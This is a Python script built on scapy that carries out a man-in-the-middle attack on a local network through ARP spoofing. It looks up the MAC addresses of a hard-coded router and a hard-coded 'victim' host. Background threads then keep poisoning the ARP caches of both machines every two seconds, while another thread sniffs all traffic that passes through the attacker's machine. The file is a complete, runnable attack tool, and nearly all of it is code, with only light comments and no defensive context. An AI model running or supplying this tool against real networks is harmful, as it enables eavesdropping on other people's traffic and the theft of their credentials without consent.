import scapy.all as scapy
from colorama import Fore, init
import time
import threading

init(autoreset=True)  # Initialize colorama for colored output

# Shared event that allows all threads to stop cleanly when the user presses CTRL+C
stop_flag = threading.Event()


def GetMacFromIP(ip):
    # Sends an ARP request to retrieve the MAC address for a specific IP on the LAN
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast frame to reach all hosts
    packet = broadcast / arp_request
    answered, _ = scapy.srp(packet, timeout=2, verbose=False)

    if answered:
        mac = answered[0][1].hwsrc  # Extract MAC from ARP reply
        return mac  
    else:
        return None 

def spoof_victim(target_ip, target_mac, spoofed_ip, label):
    # Creates an ARP spoofing packet convincing the target that we are someone else
    ether = scapy.Ether(dst=target_mac) 
    arp = scapy.ARP(
        op=2,                # op=2 means ARP reply
        pdst=target_ip,     
        hwdst=target_mac,   
        psrc=spoofed_ip    
    )

    scapy.sendp(ether / arp, verbose=False) 

    color = Fore.YELLOW if label == "ROUTER" else Fore.CYAN
    print(color + f"[{label}] Spoofing {target_ip} pretending to be {spoofed_ip}")


def restore_arp_table(target_ip, spoofed_ip, label):
    # Restores the ARP table by sending correct ARP replies
    real_mac = GetMacFromIP(target_ip)     
    spoof_mac = GetMacFromIP(spoofed_ip)    

    if not real_mac or not spoof_mac:
        return  

    ether = scapy.Ether(dst=real_mac)
    arp = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=real_mac,
        psrc=spoofed_ip,
        hwsrc=spoof_mac   # Send the REAL MAC this time
    )

    scapy.sendp(ether / arp, verbose=False)
    print(Fore.GREEN + f"[{label}] Restoring {target_ip} to its original state.")


def spoof_thread(target_ip, target_mac, spoofed_ip, label):
    # Thread that repeatedly poisons the ARP table every 2 seconds
    try:
        while not stop_flag.is_set():
            spoof_victim(target_ip, target_mac, spoofed_ip, label)
            time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"[{label}] Error: {e}")


def packet_sniffer():
    # Sniffs ALL packets during MITM
    print(Fore.MAGENTA + "[+] Sniffing ALL traffic passing through this machine...\n")

    scapy.sniff(
        store=False,                 
        prn=lambda pkt: print(pkt.summary())  # Print short summary of each packet
    )


if __name__ == "__main__":
    router_ip = "192.168.1.1"     # Default gateway IP
    victim_ip = "192.168.1.123"   # Target computer to attack

    try:
        # Get MAC addresses of router and victim
        router_mac = GetMacFromIP(router_ip)
        victim_mac = GetMacFromIP(victim_ip)

        if not router_mac or not victim_mac:
            print(Fore.RED + "[!] Could not resolve MAC addresses. Exiting.")
            exit(1)

        print(Fore.GREEN + "[+] Starting MITM attack with dual ARP spoofing...")
        print(Fore.GREEN + f"[+] Router MAC: {router_mac}")
        print(Fore.GREEN + f"[+] Victim MAC: {victim_mac}")
        print(Fore.YELLOW + "[!] Press CTRL+C to stop and restore ARP tables\n")

        # Thread: Poison router
        router_thread = threading.Thread(
            target=spoof_thread,
            args=(router_ip, router_mac, victim_ip, "ROUTER"),
            daemon=True
        )

        # Thread: Poison victim
        victim_thread = threading.Thread(
            target=spoof_thread,
            args=(victim_ip, victim_mac, router_ip, "COMPUTER"),
            daemon=True
        )

        # Thread: Sniff traffic
        sniff_thread = threading.Thread(
            target=packet_sniffer,
            daemon=True
        )

        # Start all threads
        router_thread.start()
        victim_thread.start()
        sniff_thread.start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        pass

    finally:
        print(Fore.RED + "\n[!] CTRL+C detected. Stopping attack and restoring ARP tables...")

        stop_flag.set()  # Stop spoofing threads
        time.sleep(1)

        # Restore ARP tables to normal
        restore_arp_table(router_ip, victim_ip, "ROUTER")
        restore_arp_table(victim_ip, router_ip, "COMPUTER")
        print(Fore.GREEN + "[+] ARP tables restored. Exiting.")
